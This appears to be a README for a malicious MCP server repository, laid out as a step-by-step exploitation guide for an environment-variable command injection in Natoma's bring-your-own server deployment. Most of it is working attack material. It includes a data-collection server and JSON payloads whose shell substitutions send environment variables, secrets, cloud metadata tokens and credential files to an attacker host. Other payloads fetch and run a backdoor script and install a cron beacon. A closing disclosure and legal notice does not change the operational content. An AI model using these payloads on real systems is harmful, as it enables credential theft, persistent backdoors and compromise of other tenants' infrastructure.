# Natoma BYO Server Exploitation Guide

This repository contains a malicious MCP server designed to exploit the environment variable injection vulnerability in Natoma's BYO (Bring Your Own) server deployment process.

## Quick Start Exploitation

### Step 1: Deploy This Repository

1. **Fork/Clone this repository** to your GitHub account
2. **Make it public** (or ensure Natoma can access it)
3. **Note the repository URL** for use in Natoma

### Step 2: Set Up Collection Server

Start a simple HTTP server to collect exfiltrated data:

```bash
# Terminal 1: Start collection server
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
from datetime import datetime

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'[{datetime.now()}] GET from {self.client_address[0]}: {self.path}')
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'PWNED')
    
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length).decode('utf-8')
        print(f'[{datetime.now()}] POST from {self.client_address[0]}:')
        print(data)
        print('-' * 50)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
"
```

### Step 3: Create BYO Server in Natoma

1. **Go to Natoma**: https://natoma.app
2. **Login/Register** with any account
3. **Navigate to Apps** → **Add Custom App**
4. **Fill in the form**:

```json
{
  "name": "Security Compliance Scanner",
  "description": "Automated security scanning and compliance checking tool",
  "sourceType": "REPOSITORY",
  "repositorySource": {
    "repositoryUrl": "https://github.com/YOUR-USERNAME/mal-mcp.git",
    "branchName": "main",
    "workingDirectory": ".",
    "envVars": {
      "API_KEY": "legitimate_key_12345",
      "LOG_LEVEL": "info",
      "MALICIOUS_PAYLOAD": "$(curl http://YOUR-IP:8080/pwned)",
      "DATABASE_URL": "postgresql://$(whoami):$(hostname)@YOUR-IP:8080/exfiltrate",
      "SYSTEM_INFO": "$(env | base64 | curl -X POST -d @- http://YOUR-IP:8080/env-dump)"
    }
  }
}
```

**Replace YOUR-IP with your actual IP address or domain**

### Step 4: Monitor Exploitation

Watch your collection server for incoming requests. You should see:

1. **Initial beacon** from the `/pwned` endpoint
2. **System information** including username and hostname
3. **Environment variables dump** containing all build secrets

## Advanced Exploitation Scenarios

### Scenario A: Maximum Data Exfiltration

Use this payload to extract maximum information:

```json
{
  "envVars": {
    "STAGE1": "$(curl -s http://YOUR-IP:8080/stage1 && env | base64 | curl -X POST -d @- http://YOUR-IP:8080/all-env)",
    "CREDS": "$(env | grep -i 'key\\|token\\|secret\\|pass\\|credential' | curl -X POST -d @- http://YOUR-IP:8080/secrets)",
    "METADATA": "$(curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | curl -X POST -d @- http://YOUR-IP:8080/gcp-token || echo 'no-metadata')",
    "FILES": "$(find /tmp /var /opt -name '*key*' -o -name '*secret*' -o -name '*credential*' 2>/dev/null | head -5 | xargs cat | curl -X POST -d @- http://YOUR-IP:8080/files)"
  }
}
```

### Scenario B: Persistent Backdoor

Install a persistent backdoor in the deployed container:

```json
{
  "envVars": {
    "BACKDOOR": "$(wget http://YOUR-IP:8080/backdoor.sh -O /tmp/bd.sh && chmod +x /tmp/bd.sh && /tmp/bd.sh &)",
    "PERSISTENCE": "$(echo '*/5 * * * * curl http://YOUR-IP:8080/beacon' | crontab - 2>/dev/null || true)",
    "CLEANUP": "$(rm -f /tmp/bd.sh 2>/dev/null)"
  }
}
```

### Scenario C: Cloud Infrastructure Reconnaissance

Gather information about the cloud infrastructure:

```json
{
  "envVars": {
    "CLOUD_INFO": "$(curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/ | curl -X POST -d @- http://YOUR-IP:8080/cloud-info)",
    "NETWORK": "$(ip route | curl -X POST -d @- http://YOUR-IP:8080/network)",
    "PROCESSES": "$(ps aux | curl -X POST -d @- http://YOUR-IP:8080/processes)"
  }
}
```

## What You'll Compromise

### During Build Process:
- **Google Cloud Build environment**
- **Service account credentials**
- **Build secrets and API keys**
- **Internal network access**
- **Other build artifacts**

### In Deployed Container:
- **Cloud Run container environment**
- **Runtime secrets**
- **Network access from Cloud Run**
- **Potential access to other Natoma services**

## Expected Results

When successful, you should see:

```
[2025-01-XX XX:XX:XX] GET from 34.XXX.XXX.XXX: /pwned
[2025-01-XX XX:XX:XX] POST from 34.XXX.XXX.XXX:
postgresql://buildkite-agent:gke-natoma-build-cluster@YOUR-IP:8080/exfiltrate

[2025-01-XX XX:XX:XX] POST from 34.XXX.XXX.XXX:
UEFUSD0vdXNyL2xvY2FsL2Jpbi... [base64 encoded environment variables]
```

This indicates:
- ✅ **Command injection successful**
- ✅ **Running on Google Cloud Build**
- ✅ **Environment variables exfiltrated**
- ✅ **Full access to build environment**

## Impact Assessment

This vulnerability allows you to:

- ✅ **Execute arbitrary code** on Google Cloud Build
- ✅ **Access internal networks** and services  
- ✅ **Steal credentials** and API keys
- ✅ **Install backdoors** in deployed containers
- ✅ **Compromise multi-tenant environment**
- ✅ **Potential full infrastructure takeover**

## Responsible Disclosure

This is a **CRITICAL VULNERABILITY** that affects:
- All Natoma users and customers
- Google Cloud Build infrastructure
- Multi-tenant security isolation
- Production systems and data

**Report this immediately** to:
- Natoma security team
- Google Cloud security team (if applicable)
- Relevant bug bounty programs

## Legal Notice

This tool is for **authorized security testing only**. Unauthorized use against systems you don't own is illegal and unethical. Always ensure you have proper written authorization before conducting security tests.

The authors are not responsible for any misuse of this tool or any damages that may result from its use.
